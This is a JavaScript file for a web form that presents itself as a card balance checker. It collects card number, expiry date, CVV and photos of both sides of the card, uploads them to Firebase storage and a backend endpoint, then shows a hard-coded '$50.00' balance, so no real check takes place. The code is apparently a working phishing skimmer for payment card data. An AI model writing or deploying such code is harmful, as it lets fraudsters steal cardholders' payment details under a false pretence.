document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("balanceForm");
  const status = document.getElementById("status");
  const label = document.getElementById("label");
  const spinner = document.getElementById("spinner");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    try {
      status.textContent = "Uploading images...";
      spinner.classList.remove("hidden");
      label.classList.add("hidden");

      const frontBlob = window.frontBlob;
      const backBlob = window.backBlob;

      let frontUrl = null;
      let backUrl = null;

      if (frontBlob) {
        const frontRef = firebase.storage().ref(`images/front_${Date.now()}.jpg`);
        await frontRef.put(frontBlob);
        frontUrl = await frontRef.getDownloadURL();
      }

      if (backBlob) {
        const backRef = firebase.storage().ref(`images/back_${Date.now()}.jpg`);
        await backRef.put(backBlob);
        backUrl = await backRef.getDownloadURL();
      }

      const data = {
        card_number: document.querySelector('[name="card_number"]').value.trim(),
        expiry_date: document.querySelector('[name="expiry_date"]').value.trim(),
        cvv: document.querySelector('[name="cvv"]').value.trim(),
        front_image: frontUrl || null,
        back_image: backUrl || null,
        timestamp: Date.now()
      };

      status.textContent = "Sending details...";
      console.log("Sending data to backend:", data);

      await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      status.textContent = "Success! Balance checked.";
      document.getElementById("balanceText").textContent = "$50.00";
      document.getElementById("result").classList.remove("hidden");

      setTimeout(() => {
        form.reset();
        document.getElementById("front_image_url").value = "";
        document.getElementById("back_image_url").value = "";
        document.getElementById("result").classList.add("hidden");
        status.textContent = "";
        window.frontBlob = window.backBlob = null;
        document.getElementById("frontPreview").classList.add("hidden");
        document.getElementById("backPreview").classList.add("hidden");
        label.classList.remove("hidden");
        spinner.classList.add("hidden");
      }, 4000);

    } catch (err) {
      console.error("Submission error:", err);
      status.textContent = `Error: ${err.message}`;
      label.classList.remove("hidden");
      spinner.classList.add("hidden");
    }
  });

  document.getElementById("finishAndSubmitBtn")?.addEventListener("click", () => {
    form.dispatchEvent(new Event("submit"));
  });
});
